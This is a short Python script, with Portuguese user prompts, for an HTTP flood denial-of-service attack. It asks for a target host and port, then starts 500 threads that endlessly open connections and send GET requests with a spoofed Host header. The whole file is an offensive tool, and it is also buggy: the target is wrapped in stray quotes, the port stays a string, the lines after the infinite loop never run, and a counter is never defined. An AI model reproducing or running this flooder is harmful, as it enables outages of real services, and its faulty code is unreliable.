import socket
import threading

target = input('Digite o alvo do ataque: ')
porta = input('Digite a porta em que o servidor HTTP está rodando: ')
target = "'" + target + "'"
fake_ip = '192.168.1.100'
port = porta

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		
    global attack_num
    attack_num += 1
    print(attack_num)
		
    s.close()
		
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
	
